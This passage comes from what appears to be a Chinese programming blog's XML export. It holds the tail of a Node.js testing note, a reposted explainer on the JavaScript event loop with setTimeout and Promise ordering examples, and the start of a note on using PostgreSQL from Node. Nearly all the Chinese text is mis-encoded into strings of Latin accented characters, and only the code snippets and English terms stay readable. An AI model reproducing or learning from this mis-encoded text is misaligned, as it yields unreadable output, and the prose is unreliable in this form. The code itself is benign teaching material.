å›¾ç‰‡ï¼Œç„¶åŽæ£€æŸ¥æ˜¯ä¸æ˜¯æ·»åŠ ä¸Šäº†ï¼Œåœ¨æ£€æŸ¥æ˜¯ä¸æ˜¯åŠ åˆ°äº†æ­£ç¡®çš„å›¾ç‰‡åˆ—è¡¨ä¸­ã€‚ Node ä¸­åšåŠŸèƒ½æµ‹è¯•çš„å·¥å…·å¾ˆå¤šï¼Œå®ƒä»¬å¤§ä½“ä¸Šå¯ä»¥åˆ†æˆä¸¤ç±»ï¼šæ— å¤´æµ‹è¯•å’ŒåŸºäºŽæµè§ˆå™¨çš„æµ‹è¯•ã€‚æ— å¤´æµ‹è¯•åŸºæœ¬ä¸Šéƒ½æ˜¯ç”¨ PhantomJS ä¹‹ç±»çš„å·¥å…·æä¾›ä¸€ä¸ªå¯ä»¥åœ¨ç»ˆç«¯é‡Œä½¿ç”¨çš„æµè§ˆå™¨çŽ¯å¢ƒï¼Œä¹Ÿæœ‰è½»ä¾¿çš„ä¸€äº›æ–¹æ¡ˆä¼šç”¨ Cheerio å’Œ JSDOM è¿™æ ·çš„åº“ã€‚åŸºäºŽæµè§ˆå™¨çš„æµ‹è¯•ç”¨ Seleniumä¹‹ç±»çš„æµè§ˆå™¨è‡ªåŠ¨åŒ–å·¥å…·ï¼Œé€šè¿‡è„šæœ¬é©±åŠ¨çœŸæ­£çš„æµè§ˆå™¨ã€‚ä¸¤ç§æµ‹è¯•æ–¹å¼ç”¨çš„åº•å±‚å·¥å…·éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå¯ä»¥æ ¹æ®è‡ªå·±çš„åå¥½ç”¨ Mochaã€Jasmine ç”šè‡³Cucumber é©±åŠ¨ Selenium æµ‹è¯•è‡ªå·±çš„ç¨‹åºã€‚ Selenium æ˜¯åŸºäºŽ Java çš„æµè§ˆå™¨è‡ªåŠ¨åŒ–åº“ï¼Œåœ¨ç‰¹å®šè¯­è¨€é©±åŠ¨å™¨çš„å¸®åŠ©ä¸‹ï¼Œå¯ä»¥è¿žæŽ¥åˆ° Selenium æœåŠ¡ä¸Šã€‚ç”¨çœŸæ­£çš„æœåŠ¡å™¨è·‘æµ‹è¯•ç”¨ä¾‹ã€‚ https://blog.csdn.net/huilan_same/article/details/51896672 æ€»ç»“ ç¼–å†™å•å…ƒæµ‹è¯•éœ€è¦ Mocha è¿™æ ·çš„æµ‹è¯•è¿è¡Œå™¨ Node è‡ªå¸¦äº†ä¸€ä¸ª æ–­è¨€åº“ assert è¿˜æœ‰å…¶ä»–æ–­è¨€åº“ï¼ŒåŒ…æ‹¬ Chai å’Œ Should.js å¦‚æžœä¸æƒ³è¿è¡ŒæŸäº›ä»£ç ï¼Œæ¯”å¦‚ç½‘ç»œè¯·æ±‚ï¼Œå¯ä»¥ç”¨ SinonJS SinonJS ä¹Ÿå¯ä»¥æŽ¢æµ‹ä»£ç ï¼ŒéªŒè¯æŸä¸ªå‡½æ•°æˆ–æ–¹æ³•æ˜¯ä¸æ˜¯è¿è¡Œäº†ã€‚ é€šè¿‡åˆ©ç”¨è„šæœ¬é©±åŠ¨çœŸæ­£çš„æµè§ˆå™¨ï¼Œå¯ä»¥ç”¨ Selenium ç¼–å†™æµè§ˆå™¨æµ‹è¯•]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ï¼ˆè½¬ï¼‰æ·±å…¥æµ…å‡ºJavaScript è¿è¡Œæœºåˆ¶]]></title>
    <url>%2F2018-12-28-(%E8%BD%AC)%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAJavaScript%E8%BF%90%E8%A1%8C%E8%BF%9B%E5%88%B6.html</url>
    <content type="text"><![CDATA[åŽŸæ–‡åœ°å€ï¼šæ·±å…¥æµ…å‡ºJavaScriptè¿è¡Œæœºåˆ¶ï¼ˆè½¬ï¼‰æ·±å…¥æµ…å‡ºJavaScript è¿è¡Œæœºåˆ¶è¯»å®Œä¹‹åŽæœ‰æ‰€æ”¶èŽ·ï¼Œè½¬è½½æ”¶è—ã€‚ ä¸€ã€å¼•å­æœ¬æ–‡ä»‹ç»JavaScriptè¿è¡Œæœºåˆ¶ï¼Œè¿™ä¸€éƒ¨åˆ†æ¯”è¾ƒæŠ½è±¡ï¼Œæˆ‘ä»¬å…ˆä»Žä¸€é“é¢è¯•é¢˜å…¥æ‰‹ï¼š 123456console.log(1);setTimeout(function()&#123;console.log(3);&#125;,0);console.log(2);// è¯·é—®æ•°å­—æ‰“å°é¡ºåºæ˜¯ä»€ä¹ˆï¼Ÿ è¿™ä¸€é¢˜çœ‹ä¼¼å¾ˆç®€å•ï¼Œä½†å¦‚æžœä½ ä¸äº†è§£JavaScriptè¿è¡Œæœºåˆ¶ï¼Œå¾ˆå®¹æ˜“å°±ç­”é”™äº†ã€‚é¢˜ç›®çš„ç­”æ¡ˆæ˜¯ä¾æ¬¡è¾“å‡º1 2 3ï¼Œå¦‚æžœä½ æœ‰ç–‘æƒ‘ï¼Œä¸‹æ–‡æœ‰è¯¦ç»†è§£é‡Šã€‚ äºŒã€ç†è§£JSçš„å•çº¿ç¨‹çš„æ¦‚å¿µJavaScriptè¯­è¨€çš„ä¸€å¤§ç‰¹ç‚¹å°±æ˜¯å•çº¿ç¨‹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒåŒä¸€ä¸ªæ—¶é—´åªèƒ½åšä¸€ä»¶äº‹ã€‚é‚£ä¹ˆï¼Œä¸ºä»€ä¹ˆJavaScriptä¸èƒ½æœ‰å¤šä¸ªçº¿ç¨‹å‘¢ï¼Ÿè¿™æ ·èƒ½æé«˜æ•ˆçŽ‡å•Šã€‚JavaScriptçš„å•çº¿ç¨‹ï¼Œä¸Žå®ƒçš„ç”¨é€”æœ‰å…³ã€‚ä½œä¸ºæµè§ˆå™¨è„šæœ¬è¯­è¨€ï¼ŒJavaScriptçš„ä¸»è¦ç”¨é€”æ˜¯ä¸Žç”¨æˆ·äº’åŠ¨ï¼Œä»¥åŠæ“ä½œDOMã€‚è¿™å†³å®šäº†å®ƒåªèƒ½æ˜¯å•çº¿ç¨‹ï¼Œå¦åˆ™ä¼šå¸¦æ¥å¾ˆå¤æ‚çš„åŒæ­¥é—®é¢˜ã€‚æ¯”å¦‚ï¼Œå‡å®šJavaScriptåŒæ—¶æœ‰ä¸¤ä¸ªçº¿ç¨‹ï¼Œä¸€ä¸ªçº¿ç¨‹åœ¨æŸä¸ªDOMèŠ‚ç‚¹ä¸Šæ·»åŠ å†…å®¹ï¼Œå¦ä¸€ä¸ªçº¿ç¨‹åˆ é™¤äº†è¿™ä¸ªèŠ‚ç‚¹ï¼Œè¿™æ—¶æµè§ˆå™¨åº”è¯¥ä»¥å“ªä¸ªçº¿ç¨‹ä¸ºå‡†ï¼Ÿæ‰€ä»¥ï¼Œä¸ºäº†é¿å…å¤æ‚æ€§ï¼Œä»Žä¸€è¯žç”Ÿï¼ŒJavaScriptå°±æ˜¯å•çº¿ç¨‹ï¼Œè¿™å·²ç»æˆäº†è¿™é—¨è¯­è¨€çš„æ ¸å¿ƒç‰¹å¾ï¼Œå°†æ¥ä¹Ÿä¸ä¼šæ”¹å˜ã€‚ ä¸‰ã€ç†è§£ä»»åŠ¡é˜Ÿåˆ—(æ¶ˆæ¯é˜Ÿåˆ—)å•çº¿ç¨‹å°±æ„å‘³ç€ï¼Œæ‰€æœ‰ä»»åŠ¡éœ€è¦æŽ’é˜Ÿï¼Œå‰ä¸€ä¸ªä»»åŠ¡ç»“æŸï¼Œæ‰ä¼šæ‰§è¡ŒåŽä¸€ä¸ªä»»åŠ¡ã€‚å¦‚æžœå‰ä¸€ä¸ªä»»åŠ¡è€—æ—¶å¾ˆé•¿ï¼ŒåŽä¸€ä¸ªä»»åŠ¡å°±ä¸å¾—ä¸ä¸€ç›´ç­‰ç€ã€‚JavaScriptè¯­è¨€çš„è®¾è®¡è€…æ„è¯†åˆ°è¿™ä¸ªé—®é¢˜ï¼Œå°†æ‰€æœ‰ä»»åŠ¡åˆ†æˆä¸¤ç§ï¼Œä¸€ç§æ˜¯åŒæ­¥ä»»åŠ¡ï¼ˆsynchronousï¼‰ï¼Œå¦ä¸€ç§æ˜¯å¼‚æ­¥ä»»åŠ¡ï¼ˆasynchronousï¼‰ã€‚åŒæ­¥ä»»åŠ¡æŒ‡çš„æ˜¯ï¼Œåœ¨ä¸»çº¿ç¨‹ä¸ŠæŽ’é˜Ÿæ‰§è¡Œçš„ä»»åŠ¡ï¼Œåªæœ‰å‰ä¸€ä¸ªä»»åŠ¡æ‰§è¡Œå®Œæ¯•ï¼Œæ‰èƒ½æ‰§è¡ŒåŽä¸€ä¸ªä»»åŠ¡ï¼›å¼‚æ­¥ä»»åŠ¡æŒ‡çš„æ˜¯ï¼Œä¸è¿›å…¥ä¸»çº¿ç¨‹ã€è€Œè¿›å…¥â€ä»»åŠ¡é˜Ÿåˆ—â€ï¼ˆtask queueï¼‰çš„ä»»åŠ¡ï¼Œåªæœ‰â€ä»»åŠ¡é˜Ÿåˆ—â€é€šçŸ¥ä¸»çº¿ç¨‹ï¼ŒæŸä¸ªå¼‚æ­¥ä»»åŠ¡å¯ä»¥æ‰§è¡Œäº†ï¼Œè¯¥ä»»åŠ¡æ‰ä¼šè¿›å…¥ä¸»çº¿ç¨‹æ‰§è¡Œã€‚å¼‚æ­¥ä»»åŠ¡åŒ…æ‹¬å®ä»»åŠ¡å’Œå¾®ä»»åŠ¡(åŽé¢ä¼šé‡ç‚¹ä»‹ç»)ï¼ŒæŽ¥ä¸‹æ¥æˆ‘ä»¬é€šè¿‡ä¸¤ä¸ªä¾‹å­è¯´æ˜ŽåŒæ­¥ä»»åŠ¡å’Œå¼‚æ­¥ä»»åŠ¡çš„åŒºåˆ«ï¼š 1234console.log("A");while(true)&#123; &#125;console.log("B");// è¯·é—®æœ€åŽçš„è¾“å‡ºç»“æžœæ˜¯ä»€ä¹ˆï¼Ÿ å¦‚æžœä½ çš„å›žç­”æ˜¯A,æ­å–œä½ ç­”å¯¹äº†ï¼Œå› ä¸ºè¿™æ˜¯åŒæ­¥ä»»åŠ¡ï¼Œç¨‹åºç”±ä¸Šåˆ°ä¸‹æ‰§è¡Œï¼Œé‡åˆ°while()æ­»å¾ªçŽ¯ï¼Œä¸‹é¢è¯­å¥å°±æ²¡åŠžæ³•æ‰§è¡Œã€‚ 123456console.log("A");setTimeout(function()&#123;console.log("B");&#125;,0);while(true)&#123;&#125;// è¯·é—®æœ€åŽçš„è¾“å‡ºç»“æžœæ˜¯ä»€ä¹ˆï¼Ÿ å¦‚æžœä½ çš„ç­”æ¡ˆæ˜¯Aï¼Œæ­å–œä½ çŽ°åœ¨å¯¹jsè¿è¡Œæœºåˆ¶å·²ç»æœ‰ä¸ªç²—æµ…çš„è®¤è¯†äº†ï¼é¢˜ç›®ä¸­çš„setTimeout()å°±æ˜¯ä¸ªå¼‚æ­¥ä»»åŠ¡ã€‚åœ¨æ‰€æœ‰åŒæ­¥ä»»åŠ¡æ‰§è¡Œå®Œä¹‹å‰ï¼Œä»»ä½•çš„å¼‚æ­¥ä»»åŠ¡æ˜¯ä¸ä¼šæ‰§è¡Œçš„ï¼Œå…³äºŽè¿™ç‚¹ä¸‹æ–‡è¿˜ä¼šè¯¦ç»†è¯´æ˜Žã€‚ å››ã€ç†è§£Event Loopå¼‚æ­¥æ‰§è¡Œçš„è¿è¡Œæœºåˆ¶å¦‚ä¸‹ï¼š æ‰€æœ‰åŒæ­¥ä»»åŠ¡éƒ½åœ¨ä¸»çº¿ç¨‹ä¸Šæ‰§è¡Œï¼Œå½¢æˆä¸€ä¸ªæ‰§è¡Œæ ˆï¼ˆexecution context stackï¼‰ã€‚ ä¸»çº¿ç¨‹ä¹‹å¤–ï¼Œè¿˜å­˜åœ¨ä¸€ä¸ªâ€ä»»åŠ¡é˜Ÿåˆ—â€ï¼ˆtask queueï¼‰ã€‚åªè¦å¼‚æ­¥ä»»åŠ¡æœ‰äº†è¿è¡Œç»“æžœï¼Œå°±åœ¨â€ä»»åŠ¡é˜Ÿåˆ—â€ä¹‹ä¸­æ”¾ç½®ä¸€ä¸ªäº‹ä»¶ã€‚ ä¸€æ—¦â€æ‰§è¡Œæ ˆâ€ä¸­çš„æ‰€æœ‰åŒæ­¥ä»»åŠ¡æ‰§è¡Œå®Œæ¯•ï¼Œç³»ç»Ÿå°±ä¼šè¯»å–â€ä»»åŠ¡é˜Ÿåˆ—â€ï¼Œçœ‹çœ‹é‡Œé¢æœ‰å“ªäº›äº‹ä»¶ã€‚é‚£äº›å¯¹åº”çš„å¼‚æ­¥ä»»åŠ¡ï¼ŒäºŽæ˜¯ç»“æŸç­‰å¾…çŠ¶æ€ï¼Œè¿›å…¥æ‰§è¡Œæ ˆï¼Œå¼€å§‹æ‰§è¡Œã€‚ ä¸»çº¿ç¨‹ä¸æ–­é‡å¤ä¸Šé¢çš„ç¬¬ä¸‰æ­¥ã€‚ ä¸»çº¿ç¨‹ä»Žâ€ä»»åŠ¡é˜Ÿåˆ—â€ä¸­è¯»å–äº‹ä»¶ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯å¾ªçŽ¯ä¸æ–­çš„ï¼Œæ‰€ä»¥æ•´ä¸ªçš„è¿™ç§è¿è¡Œæœºåˆ¶åˆç§°ä¸ºEvent Loopï¼ˆäº‹ä»¶å¾ªçŽ¯ï¼‰ã€‚åªè¦ä¸»çº¿ç¨‹ç©ºäº†ï¼Œå°±ä¼šåŽ»è¯»å–â€ä»»åŠ¡é˜Ÿåˆ—â€ï¼Œè¿™å°±æ˜¯JavaScriptçš„è¿è¡Œæœºåˆ¶ã€‚è¿™ä¸ªè¿‡ç¨‹ä¼šå¾ªçŽ¯åå¤ã€‚ä»¥ä¸‹è¿™å¼ å›¾å¯ä»¥å¾ˆå¥½è¯´æ˜Žè¿™ç‚¹ã€‚ äº”ã€å“ªäº›è¯­å¥ä¼šæ”¾å…¥å¼‚æ­¥ä»»åŠ¡é˜Ÿåˆ—åŠæ”¾å…¥æ—¶æœºä¸€èˆ¬æ¥è¯´ï¼Œæœ‰ä»¥ä¸‹å››ç§ä¼šæ”¾å…¥å¼‚æ­¥ä»»åŠ¡é˜Ÿåˆ—ï¼š setTimeoutå’Œsetlnterval DOMäº‹ä»¶ ES6ä¸­çš„Promise Ajaxå¼‚æ­¥è¯·æ±‚ javascript ä»£ç è¿è¡Œåˆ†ä¸¤ä¸ªé˜¶æ®µï¼š 1ã€é¢„è§£æžâ€”æŠŠæ‰€æœ‰çš„å‡½æ•°å®šä¹‰æå‰ï¼Œæ‰€æœ‰çš„å˜é‡å£°æ˜Žæå‰ï¼Œå˜é‡çš„èµ‹å€¼ä¸æå‰ 2ã€æ‰§è¡Œâ€”ä»Žä¸Šåˆ°ä¸‹æ‰§è¡Œï¼ˆæŒ‰ç…§jsè¿è¡Œæœºåˆ¶ï¼‰ è‡³äºŽæ”¾å…¥å¼‚æ­¥ä»»åŠ¡é˜Ÿåˆ—çš„æ—¶æœºï¼Œæˆ‘ä»¬é€šè¿‡ setTimeoutçš„ä¾‹å­å’ŒAjaxä¾‹å­æ¥è¯¦ç»†è¯´æ˜Žï¼š 1234567ä¾‹é¢˜1for (var i = 0; i &lt; 5; i++) &#123;setTimeout(function() &#123; console.log(i); &#125;, 1000);&#125;// è¯·é—®æœ€åŽçš„è¾“å‡ºç»“æžœæ˜¯ä»€ä¹ˆï¼Ÿ forå¾ªçŽ¯ä¸€æ¬¡ç¢°åˆ°ä¸€ä¸ª setTimeout()ï¼Œå¹¶ä¸æ˜¯é©¬ä¸ŠæŠŠsetTimeout()æ‹¿åˆ°å¼‚æ­¥é˜Ÿåˆ—ä¸­ï¼Œè€Œè¦ç­‰åˆ°ä¸€ç§’åŽï¼Œæ‰å°†å…¶æ”¾åˆ°ä»»åŠ¡é˜Ÿåˆ—é‡Œé¢ï¼Œä¸€æ—¦â€æ‰§è¡Œæ ˆâ€ä¸­çš„æ‰€æœ‰åŒæ­¥ä»»åŠ¡æ‰§è¡Œå®Œæ¯•ï¼ˆå³forå¾ªçŽ¯ç»“æŸï¼Œæ­¤æ—¶iå·²ç»ä¸º5ï¼‰ï¼Œç³»ç»Ÿå°±ä¼šè¯»å–å·²ç»å­˜æ”¾â€ä»»åŠ¡é˜Ÿåˆ—â€çš„setTimeout()ï¼ˆæœ‰äº”ä¸ªï¼‰ï¼ŒäºŽæ˜¯ç­”æ¡ˆæ˜¯è¾“å‡º5ä¸ª5ã€‚ ä¸Šé¢ä¹Ÿæåˆ°ï¼Œåœ¨åˆ°è¾¾æŒ‡å®šæ—¶é—´æ—¶ï¼Œå®šæ—¶å™¨å°±ä¼šå°†ç›¸åº”å›žè°ƒå‡½æ•°æ’å…¥â€œä»»åŠ¡é˜Ÿåˆ—â€å°¾éƒ¨ã€‚è¿™å°±æ˜¯â€œå®šæ—¶å™¨ï¼ˆtimerï¼‰â€åŠŸèƒ½ã€‚ å…³äºŽå®šæ—¶å™¨çš„é‡è¦è¡¥å……ï¼š å®šæ—¶å™¨åŒ…æ‹¬setTimeoutä¸Ž setInterval ä¸¤ä¸ªæ–¹æ³•ã€‚å®ƒä»¬çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯æŒ‡å®šå…¶å›žè°ƒå‡½æ•°æŽ¨è¿Ÿ/æ¯éš”å¤šå°‘æ¯«ç§’æ•°åŽæ‰§è¡Œã€‚ å¯¹äºŽç¬¬äºŒä¸ªå‚æ•°æœ‰ä»¥ä¸‹éœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼š å½“ç¬¬äºŒä¸ªå‚æ•°ç¼ºçœæ—¶ï¼Œé»˜è®¤ä¸º 0ï¼› å½“æŒ‡å®šçš„å€¼å°äºŽ 4 æ¯«ç§’ï¼Œåˆ™å¢žåŠ åˆ° 4ms(4ms æ˜¯ HTML5 æ ‡å‡†æŒ‡å®šçš„ï¼Œå¯¹äºŽ 2010 å¹´åŠä¹‹å‰çš„æµè§ˆå™¨åˆ™æ˜¯ 10ms);ä¹Ÿå°±æ˜¯è¯´è‡³å°‘éœ€è¦4æ¯«ç§’ï¼Œè¯¥setTimeout()æ‹¿åˆ°ä»»åŠ¡é˜Ÿåˆ—ä¸­ã€‚ 1234567891011121314// ä¾‹é¢˜2$.ajax(&#123;urlï¼šâ€œxxxxx",success:function (result)&#123;console.log("a") &#125;&#125;)setTimeout(function ()&#123;console.log("b")&#125;,100)setTimeout(function ()&#123;console.log("c")&#125;)console.log("d"); ajaxåŠ è½½å®Œæˆæ—¶æ‰ä¼šæ”¾å…¥å¼‚æ­¥é˜Ÿåˆ—ï¼Œè‡³äºŽè¿™æ®µæ—¶é—´ä¸ç¡®å®šï¼Œæ‰€æœ‰æœ‰ä¸¤ç§æƒ…å†µï¼šâ‘ å¤§äºŽ100ms,æœ€åŽçš„ç»“æžœæ˜¯ d c b a ;â‘¡å°äºŽ100ms,æœ€åŽçš„ç»“æžœä¾¿æ˜¯d c a bã€‚ å…­ã€å¾®ä»»åŠ¡(Microtask)ä¸Žå®ä»»åŠ¡(Macrotask) æˆ‘ä»¬ä¸Šé¢æåˆ°å¼‚æ­¥ä»»åŠ¡åˆ†ä¸ºå®ä»»åŠ¡å’Œå¾®ä»»åŠ¡ï¼Œå®ä»»åŠ¡é˜Ÿåˆ—å¯ä»¥æœ‰å¤šä¸ªï¼Œå¾®ä»»åŠ¡é˜Ÿåˆ—åªæœ‰ä¸€ä¸ªã€‚ å®ä»»åŠ¡åŒ…æ‹¬ï¼šscript(å…¨å±€ä»»åŠ¡), setTimeout, setInterval, setImmediate, I/O, UI renderingã€‚ å¾®ä»»åŠ¡åŒ…æ‹¬: new Promise().then(å›žè°ƒ), process.nextTick, Object.observe(å·²åºŸå¼ƒ), MutationObserver(html5æ–°ç‰¹æ€§) å½“æ‰§è¡Œæ ˆä¸­çš„æ‰€æœ‰åŒæ­¥ä»»åŠ¡æ‰§è¡Œå®Œæ¯•æ—¶ï¼Œæ˜¯å…ˆæ‰§è¡Œå®ä»»åŠ¡è¿˜æ˜¯å¾®ä»»åŠ¡å‘¢ï¼Ÿ ç”±äºŽæ‰§è¡Œä»£ç å…¥å£éƒ½æ˜¯å…¨å±€ä»»åŠ¡ scriptï¼Œè€Œå…¨å±€ä»»åŠ¡å±žäºŽå®ä»»åŠ¡ï¼Œæ‰€ä»¥å½“æ ˆä¸ºç©ºï¼ŒåŒæ­¥ä»»åŠ¡ä»»åŠ¡æ‰§è¡Œå®Œæ¯•æ—¶ï¼Œä¼šå…ˆæ‰§è¡Œå¾®ä»»åŠ¡é˜Ÿåˆ—é‡Œçš„ä»»åŠ¡ã€‚ å¾®ä»»åŠ¡é˜Ÿåˆ—é‡Œçš„ä»»åŠ¡å…¨éƒ¨æ‰§è¡Œå®Œæ¯•åŽï¼Œä¼šè¯»å–å®ä»»åŠ¡é˜Ÿåˆ—ä¸­æ‹æœ€å‰çš„ä»»åŠ¡ã€‚ æ‰§è¡Œå®ä»»åŠ¡çš„è¿‡ç¨‹ä¸­ï¼Œé‡åˆ°å¾®ä»»åŠ¡ï¼Œä¾æ¬¡åŠ å…¥å¾®ä»»åŠ¡é˜Ÿåˆ—ã€‚ æ ˆç©ºåŽï¼Œå†æ¬¡è¯»å–å¾®ä»»åŠ¡é˜Ÿåˆ—é‡Œçš„ä»»åŠ¡ï¼Œä¾æ¬¡ç±»æŽ¨ã€‚ ä¸€å¥è¯æ¦‚æ‹¬ä¸Šé¢çš„æµç¨‹å›¾ï¼šå½“æŸä¸ªå®ä»»åŠ¡é˜Ÿåˆ—çš„ä¸­çš„ä»»åŠ¡å…¨éƒ¨æ‰§è¡Œå®Œä»¥åŽ,ä¼šæŸ¥çœ‹æ˜¯å¦æœ‰å¾®ä»»åŠ¡é˜Ÿåˆ—ã€‚å¦‚æžœæœ‰ï¼Œå…ˆæ‰§è¡Œå¾®ä»»åŠ¡é˜Ÿåˆ—ä¸­çš„æ‰€æœ‰ä»»åŠ¡ï¼Œå¦‚æžœæ²¡æœ‰ï¼Œå°±æŸ¥çœ‹æ˜¯å¦æœ‰å…¶ä»–å®ä»»åŠ¡é˜Ÿåˆ—ã€‚ æŽ¥ä¸‹æ¥æˆ‘ä»¬çœ‹ä¸¤é“ä¾‹å­æ¥ä»‹ç»ä¸Šé¢æµç¨‹ï¼š 123456789101112Promise.resolve().then(()=&gt;&#123; console.log('Promise1') setTimeout(()=&gt;&#123; console.log('setTimeout2') &#125;,0)&#125;)setTimeout(()=&gt;&#123; console.log('setTimeout1') Promise.resolve().then(()=&gt;&#123; console.log('Promise2') &#125;)&#125;,0) æœ€åŽè¾“å‡ºç»“æžœæ˜¯Promise1ï¼ŒsetTimeout1ï¼ŒPromise2ï¼ŒsetTimeout2 ä¸€å¼€å§‹æ‰§è¡Œæ ˆçš„åŒæ­¥ä»»åŠ¡æ‰§è¡Œå®Œæ¯•ï¼Œä¼šåŽ»æŸ¥çœ‹æ˜¯å¦æœ‰å¾®ä»»åŠ¡é˜Ÿåˆ—ï¼Œä¸Šé¢˜ä¸­å­˜åœ¨(æœ‰ä¸”åªæœ‰ä¸€ä¸ª)ï¼Œç„¶åŽæ‰§è¡Œå¾®ä»»åŠ¡é˜Ÿåˆ—ä¸­çš„æ‰€æœ‰ä»»åŠ¡è¾“å‡ºPromise1ï¼ŒåŒæ—¶ä¼šç”Ÿæˆä¸€ä¸ªå®ä»»åŠ¡ setTimeout2 ç„¶åŽåŽ»æŸ¥çœ‹å®ä»»åŠ¡é˜Ÿåˆ—ï¼Œå®ä»»åŠ¡ setTimeout1 åœ¨ setTimeout2 ä¹‹å‰ï¼Œå…ˆæ‰§è¡Œå®ä»»åŠ¡ setTimeout1ï¼Œè¾“å‡º setTimeout1 åœ¨æ‰§è¡Œå®ä»»åŠ¡setTimeout1æ—¶ä¼šç”Ÿæˆå¾®ä»»åŠ¡Promise2 ï¼Œæ”¾å…¥å¾®ä»»åŠ¡é˜Ÿåˆ—ä¸­ï¼ŒæŽ¥ç€å…ˆåŽ»æ¸…ç©ºå¾®ä»»åŠ¡é˜Ÿåˆ—ä¸­çš„æ‰€æœ‰ä»»åŠ¡ï¼Œè¾“å‡º Promise2 æ¸…ç©ºå®Œå¾®ä»»åŠ¡é˜Ÿåˆ—ä¸­çš„æ‰€æœ‰ä»»åŠ¡åŽï¼Œå°±åˆä¼šåŽ»å®ä»»åŠ¡é˜Ÿåˆ—å–ä¸€ä¸ªï¼Œè¿™å›žæ‰§è¡Œçš„æ˜¯ setTimeout2 12345678910111213console.log('----------------- start -----------------');setTimeout(() =&gt; &#123; console.log('setTimeout');&#125;, 0)new Promise((resolve, reject) =&gt;&#123; for (var i = 0; i &lt; 5; i++) &#123; console.log(i); &#125; resolve(); // ä¿®æ”¹promiseå®žä¾‹å¯¹è±¡çš„çŠ¶æ€ä¸ºæˆåŠŸçš„çŠ¶æ€&#125;).then(() =&gt; &#123; console.log('promiseå®žä¾‹æˆåŠŸå›žè°ƒæ‰§è¡Œ');&#125;)console.log('----------------- end -----------------'); ä¸ƒã€é¢˜å¤–è¯å¦‚æžœè¦è¾“å‡º0~4ï¼Œä¸Šé¢ä¾‹é¢˜åº”è¯¥å¦‚ä½•ä¿®æ”¹ï¼Ÿ å°†varå˜ä¸ºlet 12345for (let i = 0; i &lt; 5; i++) &#123;setTimeout(function() &#123; console.log(i); &#125;, 1000);&#125; 2.åŠ ä¸ªç«‹å³æ‰§è¡Œå‡½æ•° 1234567for (var i = 0; i &lt; 5; i++) &#123;(function(i)&#123;setTimeout(function() &#123; console.log(i); &#125;, 1000);&#125;)(i)&#125; 3.ä¹Ÿå¯ä»¥é€šè¿‡è¿™æ ·åŠ é—­åŒ… 123456789for(var i = 1;i &lt; 5;i++)&#123; var a = function()&#123; var j = i; setTimeout(function()&#123; console.log(j); &#125;,1000) &#125; a();&#125; å…«ã€å‚è€ƒèµ„æ–™JavaScript è¿è¡Œæœºåˆ¶è¯¦è§£ï¼šå†è°ˆEvent Loop å…³äºŽJavaScriptå•çº¿ç¨‹çš„ä¸€äº›äº‹ JSäº‹ä»¶å¾ªçŽ¯æœºåˆ¶ï¼ˆevent loopï¼‰ä¹‹å®ä»»åŠ¡/å¾®ä»»åŠ¡ å‰ç«¯åŸºç¡€è¿›é˜¶ï¼ˆåäºŒï¼‰ï¼šæ·±å…¥æ ¸å¿ƒï¼Œè¯¦è§£äº‹ä»¶å¾ªçŽ¯æœºåˆ¶ äº‹ä»¶å¾ªçŽ¯æœºåˆ¶çš„é‚£äº›äº‹]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>æ·±å…¥æµ…å‡º JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nodejså®žæˆ˜ â€”â€” å­˜å‚¨æ•°æ®]]></title>
    <url>%2F2018-12-21-NodeJs2-Part8.html</url>
    <content type="text"><![CDATA[è¯» ã€Šnode.jså®žæˆ˜2.0ã€‹ï¼Œè¿›è¡Œå­¦ä¹ è®°å½•æ€»ç»“ã€‚ å½“å½“ç½‘è´­ä¹°é“¾æŽ¥ è±†ç“£ç½‘1.0é“¾æŽ¥ å­˜å‚¨æ•°æ®æœ¬ç« å†…å®¹ï¼š å…³ç³»åž‹æ•°æ®åº“ï¼šPostgreSQL éžå…³ç³»åž‹æ•°æ®åº“ï¼šMongoDB ACID ç±» äº‘æ•°æ®åº“å’Œå­˜å‚¨æœåŠ¡ å…³ç³»åž‹æ•°æ®åº“å…³ç³»åž‹æ•°æ®åº“ä»¥å…³ç³»ä»£æ•°å’Œé›†åˆè®ºä¸ºç†è®ºåŸºç¡€ã€‚ç”¨æ¨¡å¼æŒ‡å®šå„ç§æ•°æ®ç±»åž‹çš„æ ¼å¼å’Œè¿™äº›æ•°æ®ç±»åž‹ä¹‹é—´çš„å…³ç³»ã€‚ä¾‹å¦‚ï¼Œåšç¤¾äº¤ç½‘ç»œæ—¶ä¼šæœ‰ User å’Œ Post ç±»åž‹ï¼Œå®ƒä»¬ä¹‹é—´è¿˜ä¼šæœ‰ä¸€å¯¹å¤šçš„å…³ç³»ï¼Œç„¶åŽç”¨ç»“æž„åŒ–æŸ¥è¯¢è¯­è¨€ï¼ˆSQLï¼‰å‘èµ·æ•°æ®æŸ¥è¯¢ï¼Œæ¯”å¦‚â€œç»™æˆ‘ID ä¸º 123 çš„ç”¨æˆ·åä¸‹çš„æ‰€æœ‰å¸–å­â€ï¼Œç”¨ SQL è¡¨ç¤ºå°±æ˜¯ï¼š 1SELECT * FROM post WHERE user_id = 123 PostgreSQLåœ¨ Node ç¨‹åºä¸­ï¼ŒMySQL å’Œ PostgreSQL éƒ½æ˜¯å¸¸ç”¨çš„å…³ç³»åž‹æ•°æ®åº“ã€‚é€‰æ‹©çœ‹ä¸ªäººå–œå¥½ã€‚ å®‰è£…å’Œé…ç½®Postgres çš„å®‰è£…ï¼ˆwinï¼‰,ä»Ž https://postgresql.org ä¸‹è½½å®‰è£…å™¨ã€‚å®‰è£…å’Œé…ç½®æ•™ç¨‹ win å¯åŠ¨ï¼špsql -h localhost -U postgres ä»Ž Node ä¸­è¿žæŽ¥ Postgresåœ¨ Node ä¸­ä¸Ž Postgres äº¤äº’æœ€å—æ¬¢è¿Žçš„åŒ…å°±æ˜¯ pgmï¼Œä¹Ÿå¯ä»¥ç”¨ npmåŒ…è£…ï¼š 1npm install pg --save è¿žæŽ¥æ•°æ®åº“ 123456789const pg = require('pg');// é…ç½®è¿žæŽ¥å‚æ•°const db = new pg.Client(&#123; database: 'articles' &#125;);db.connect((err,client) =&gt;&#123; 